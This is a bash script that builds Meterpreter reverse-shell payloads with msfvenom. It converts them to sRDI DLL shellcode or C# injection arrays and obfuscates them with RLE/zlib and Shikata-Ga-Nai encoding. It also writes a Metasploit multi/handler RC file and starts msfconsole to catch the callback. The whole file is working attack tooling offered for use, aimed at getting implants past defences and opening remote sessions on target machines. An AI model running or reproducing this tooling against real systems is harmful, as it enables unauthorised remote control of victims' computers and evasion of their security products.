#!/bin/bash

DEF_FNAME="/tmp/msf-revhttp.raw"
DEF_LPORT=8080
DEF_IFACE="tun0"
X86=0
LINUX=0
RC_CREATE=0
CLIPBOARD=0
START_MSF=0
CACHE=0
DUMP=0
SLHOST=""
SSL=0
RDI=0
RLE=0
CSE=0
STAGED=0
CONVERTER="/opt/sRDI/Python/ConvertToShellcode.py"
ENCODER="/tmp/rle.py"
SGN=0
CS=0

write_encoder(){

    echo "#!/usr/bin/env python
import sys
import argparse
import gzip
import base64
import codecs
import io

def zlib_encode(data):
    compressed = codecs.encode(bytes(data, 'utf-8'), 'zlib')
    return base64.b64encode(compressed).decode()
    
def zlib_decode(data):
    compressed = base64.b64decode(data)
    return compressed.decode('zlib')


def rle_encode(data):
    encoding = ''
    prev_char = ''
    count = 1

    if not data: return ''

    for char in data:
        if char != prev_char:
            if prev_char:
                encoding += str(count) + prev_char + ':'
            count = 1
            prev_char = char
        else:
            count += 1
    else:
        encoding += str(count) + prev_char
        return encoding

def rle_decode(data):
    decode = ''
    count = ''

    pairs = data.split(':')
    decode = ''
    for p in pairs:
        decode += p[-1] * int(p[:-1])
    return decode


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Simple Run Length Encoder')
    parser.add_argument('-d', '--decode', required=False, action='store_true', default=False, help='Decode instead of encoding')
    parser.add_argument('-a', '--alg', required=False, choices=['zlib', 'rle', 'all'], default='all', help='Encoding Algorithm')
    parser.add_argument('data', type=str, default=False, help='Data to encode/decode')
    
    args = parser.parse_args()

    if not args.decode:
        if args.alg == 'rle':
            out = rle_encode(args.data)
        elif args.alg == 'zlib':
            out = zlib_encode(args.data)
        else:
            out = zlib_encode(args.data)
            out = rle_encode(out)
    else:
        if args.alg == 'rle':
            out = rle_decode(args.data)
        elif args.alg == 'zlib':
            out = zlib_decode(args.data)
        else:
            out = rle_decode(args.data)
            out = zlib_decode(out)
    print(out)
   " > "$ENCODER"
   sudo chmod +x "$ENCODER"
}

function precheck() {
    ifaces=()
    echo "[*] Fetching interfaces"
    counter=0
    ifaces=($(sudo ifconfig | grep 'flags' | awk '{print $1}' | tr -d '\n' | sed 's/:/ /g')) 
    ifaces+=("Quit")
    for iface in ${ifaces[@]}; do 
        echo "    - $counter: $iface"; 
        counter=$((counter+1))
    done
    
    opt="a"

    while ! [[ $opt =~ [0-9]  ]]; do
        read -p '[*] Select interface: ' opt
    done
    if [ $opt -ge ${#ifaces[@]} ]; then
        echo "[-] Quitting. Bye!"
        return 1
    fi

    netinterface=${ifaces[$opt]}
    if [[ "$netinterface" == "Quit" ]]; then
        echo "[-] Quitting. Bye!"
        return 1
    fi
    netinf_ip=$(sudo ifconfig $netinterface | grep "inet " | awk '{print $2}')
        
    if [[ "$netinf_ip" == "" ]]; then        
        echo "[-] The chosen interface doesn't have a valid IP configuration. Exiting."
        return 1
    else
        echo "[+] Chosen IP: $netinf_ip"
        DEF_IFACE="$netinterface"
        return 0
    fi
}

create_rc () {
    if [[ "$1" == "" ]] || [[ "$2" == "" ]]; then
        return 1
    else
        rc_file="$1"
        payload="$2"
        echo "[+] Generating MSF RC File: $rc_file"
        echo "use exploit/multi/handler" > $rc_file
        echo "set payload $payload" >> $rc_file
        echo "set LHOST $IFACE" >> $rc_file
        echo "set LPORT $LPORT" >> $rc_file
        echo "set EXITFUNC thread" >> $rc_file
        echo "set Autoloadstdapi false" >> $rc_file
        echo "set EnableStageEncoding true" >> $rc_file
        echo "set StagerEncoder x64/zutto_dekiru" >> $rc_file
        echo "set StageEncodingFallback false" >> $rc_file
        echo "set WfsDelay 60" >> $rc_file

        # autoverifysession=false autoloadstdapi=false enablestageencoding=true stagerencoder=x64/zutto_dekiru StageEncodingFallback=false EXITFUNC=process WfsDelay=60
        echo "set autoverifysession false" >> $rc_file
        echo "set EXITONSESSION false" >> $rc_file
        echo "run -j" >> $rc_file
        return 0
    fi
}



help="\n
[*] Usage: $0 [-l LPORT] [-i interface] [-f payload-file] [-m|-r][--x86]\n
[*] Options:\n
\t-l|--lport:\t\tLocal Listener (default: $DEF_LPORT)\n
\t-f|--payload-file:\tPayload File   (default: $DEF_FNAME)\n
\t-i|--interface:\t\tList Interface (default: $DEF_IFACE)\n
\t-m|--start-msf:\t\tStarts MSF Hanlder (default: false) [implies -r]\n
\t-r|--generate-rc:\tGenerate MSF RC File (default: false)\n
\t--spoof-ip:\t\tInject an arbitrary IP (default: false)\n
\t--x86:\t\t\tForce 32bit payload (default: false)\n
\t--linux:\t\tForce Linux payload (default: false)\n
\t--staged:\t\tForce staged payload (default: false)\n
\t--clip:\t\t\tCopy payload to clipboard (default: false)\n
\t--cache:\t\tPrint last payload files locations (default: false)\n
\t--dump:\t\t\tPrint last payload generated (default: false)\n
\t--ssl:\t\t\tForce use of SSL (default: false)\n
\t--cse:\t\t\tCraft C# payload using shellcode injection(default: false)\n
\t--rdi:\t\t\tCraft C# payload using RDI (default: false)\n
\t--rle:\t\t\tEncode RDI Shellcode with RLE(default: false)\n
\t--sgn:\t\t\tEncode Shellcode with SGN(default: false)\n
\t--cs:\t\t\tPrint Shellcode as C# Array(default: false)\n
"

if [[ "$1" == "" ]]; then
    echo "[-] No option specified, running with default profile"
    precheck
    if [ $? -eq 1 ]; then
        exit 1
    fi
fi
while (( "$#" )); do
    case "$1" in
        -h|--help)
            echo -e $help
            exit 0
            ;;
        -l|--lport)
            LPORT=$2
            shift 2
            ;;
        -f|--payload-file)
            FNAME=$2
            shift 2
            ;;
        --x86)
            X86=1
            shift 1
            ;;
        --staged)
            STAGED=1
            shift 1
            ;;
        -i|--interface)
            IFACE=$2
            shift 2
            ;;
        -m|--start-msf)
            RC_CREATE=1
            START_MSF=1
            shift 1
            ;;
        -r|--generate-rc)
            RC_CREATE=1
            shift 1
            ;;
        --clip)
            CLIPBOARD=1
            shift 1
            ;;
        --spoof-ip)
            SLHOST=$2
            shift 2
            ;;
        --cache)
            CACHE=1
            shift 1
            ;;
        --dump)
            CACHE=1
            DUMP=1
            shift 1
            ;;
        --ssl)
            SSL=1
            shift 1
            ;;
        --cse)
            CSE=1
            shift 1
            ;;
        --rdi)
            RDI=1
            shift 1
            ;;
        --rle)
            RLE=1
            shift 1
            ;;
        --sgn)
            SGN=1
            shift 1
            ;;
        --cs)
            CS=1
            shift 1
            ;;
        --linux)
            LINUX=1
            shift 1
            ;;
        --) # end argument parsing
            shift
            break
            ;;
        -*|--*=) # unsupported flags
            echo  "Error: Unsupported flag $1" >&2
            exit 1
            ;;
        *) # preserve positional arguments
            if [[ "$PARAMS" == "" ]];    then
                PARAMS="$1"
            fi
            shift
            ;;
    esac
done


if [ $CACHE -gt 0 ]; then
    if [[ "$MSF_LAST_HTTPREV" == "" ]]; then
        echo "[-] No cached payload in memory"
    else
        echo "[+] Last payload used:"
        if [ $DUMP -gt 0 ]; then
            cat $MSF_LAST_HTTPREV
        else
            echo $MSF_LAST_HTTPREV
        fi
    fi
    if [[ "$MSF_LAST_HTTPREV_RDI" == "" ]]; then
        echo "[-] No cached RDI payload in memory"
    else
        echo "[+] Last RDI payload used:"
        if [ $DUMP -gt 0 ]; then
            cat $MSF_LAST_HTTPREV_RDI
        else
            echo $MSF_LAST_HTTPREV_RDI
        fi
    fi
    if [[ "$MSF_LAST_HTTPREV_RC" == "" ]]; then
        echo "[-] No cached RC File in memory"
    else
        echo "[+] Last RC used:"
        if [ $DUMP -gt 0 ]; then
            cat $MSF_LAST_HTTPREV_RC
        else
            echo $MSF_LAST_HTTPREV_RC
        fi
    fi
    if [[ "$MSF_LAST_HTTPREV_SHELLEX" == "" ]]; then
        echo "[-] No cached C# shellcode file in memory"
    else
        echo "[+] Last C# shellcode file used:"
        if [ $DUMP -gt 0 ]; then
            cat $MSF_LAST_HTTPREV_SHELLEX
        else
            echo $MSF_LAST_HTTPREV_SHELLEX
        fi
    fi

    exit 1
fi

if [[ "$FNAME" == "" ]]; then
    echo "[-] No filename provided, using $DEF_FNAME"
    FNAME=$DEF_FNAME
fi
if [[ "$LPORT" == "" ]]; then
    echo "[-] No listen port provided, using $DEF_LPORT"
    LPORT=$DEF_LPORT
fi
if [[ "$IFACE" == "" ]]; then
    echo "[-] No listen interface provided, using $DEF_IFACE"
    IFACE=$DEF_IFACE
fi

if [[ "$SLHOST" != "" ]]; then
    if [[ "$SLHOST" =~ ^(([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))\.){3}([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))$ ]]; then
        echo "[+] Spoofing IP: $SLHOST"
        IFACE=$SLHOST
    else
        echo "[-] Spoofing works only with a valid IP address"
        exit 1
    fi
fi

platform="windows"
base_payload_name="windows"

if [ $LINUX -gt 0 ]; then
    STAGED=1
    platform="linux"
    base_payload_name="linux"
fi

if [ $X86 -gt 0 ]; then
    arch="32"
    msfarch="x86"
else
    base_payload_name="$base_payload_name/x64"
    arch="64"
    msfarch="x64"
fi

if [ $SSL -eq 1 -a $STAGED -lt 1 ]; then
    payload_name="meterpreter_reverse_https"
elif [ $SSL -eq 0 -a $STAGED -lt 1 ]; then
    payload_name="meterpreter_reverse_http"
elif [ $SSL -eq 1 -a $STAGED -eq 1 ]; then
    payload_name="meterpreter/reverse_https"
elif [ $SSL -eq 0 -a $STAGED -eq 1 ]; then
    payload_name="meterpreter/reverse_http"
fi

if [ $LINUX -gt 0 ]; then
    payload_name=$(echo $payload_name | sed 's/http/tcp/g')
fi

payload_name="$base_payload_name/$payload_name"

exitfunc="thread"
ptype="raw"
if [ $RDI -gt 0 ]; then
    ptype="dll"
    exitfunc="process"
elif [ $CSE -gt 0 ]; then
    ptype="csharp"
fi
session_file=$(mktemp /tmp/msf-revhttp.XXXXXXXXXXXXX)

echo "[*] Generating $arch payload"
options="autoverifysession=false autoloadstdapi=false enablestageencoding=true stagerencoder=x64/zutto_dekiru StageEncodingFallback=false AutoVerifySession=false Autoloadstdapi=false WfsDelay=60"
cmd="msfvenom -p $payload_name LHOST=$IFACE LPORT=$LPORT EXITFUNC=$exitfunc $options -f $ptype -o $FNAME --platform $platform -a $msfarch"

echo "  [>] Executing: $cmd"

$cmd

payload=$(xxd -ps $FNAME | tr -d '\n')

payload_file="$session_file.shellcode"
rdi_file="$session_file.rdi-shellcode"
cse_file="$session_file.cse-shellcode"

echo "$payload" > "$payload_file"

export MSF_LAST_HTTPREV=$payload_file

if [ $RDI -gt 0 ]; then
    $CONVERTER $FNAME
    pic_file=$(echo "$FNAME" | sed 's/\.raw$/\.bin/g')
    payload=$(base64 -w0 $pic_file)
    export MSF_LAST_HTTPREV_RDI=$pic_file
    msg="[+] Final payload (to use with C# dll injection):"
elif [ $CSE -gt 0 ]; then
    msg="[+] Final payload (to use with C# shellcode injection):"
    tmpfname="$FNAME-hex"
    cat $FNAME | tr -d "\n" | sed -e 's/^.*{//g' -e 's/\}.*$//g' -e 's/0x//g' -e 's/,//g' | xxd -r -p - > $tmpfname
    payload=$(base64 -w0 $tmpfname)
    echo "$payload" > "$cse_file"
    export MSF_LAST_HTTPREV_SHELLEX=$cse_file
else
    msg="[+] Final payload (to use in covenant shellcode task):"
fi


if [ $RLE -gt 0 ] && ([ ! $RDI -eq 0 ] || [ ! $CSE -eq 0 ]); then
    echo "[+] Encoding payload with RLE"
    write_encoder
    payload=$($ENCODER "$payload")
    echo "$payload" > "$rdi_file"
elif [ $RLE -gt 0 ] && [ $RDI -eq 0 ] && [ $CSE -eq 0 ]; then
    echo "[-] RLE Encoding not supported for raw shellcode"
fi

echo "$msg"

if [ $CLIPBOARD -gt 0 ]; then
    echo -n "$payload" | xclip -i -selection clipboard
fi

echo $payload


if [ $RC_CREATE -gt 0 ]; then
    rc_file="$session_file.rc"
    export MSF_LAST_HTTPREV_RC=$rc_file
    create_rc $rc_file "$payload_name"
    res=$?
    if [ $res -gt 0 ]; then
        echo "[-] Error Creating RC File"
        exit 1
    fi
fi

if [ $START_MSF -gt 0 ]; then
    if [[ "$rc_file" == "" ]]; then
        echo "[-] No RC file found. Aborting."
    else
        echo "[*] Starting Metasploit Framework Console"
        xfce4-terminal -x sudo msfconsole -r $rc_file &>/dev/null &
    fi
fi

fn_s=""
if [ $SGN -gt 0 ]; then
   if [ $RLE -gt 0 ]; then 
      echo "[-] SGN not supported in combo with RLE"
      exit 1
   fi
   fn_s=".sgn"
   echo "[*] Encoding shellcode with Shikata-Ga-Nai"
   sgn -a "$arch" "$FNAME"
fi

if [ $CS -gt 0 ]; then
   echo "[*] Resulting C# payload"
   bin2csharp "$FNAME$fn_s"
fi
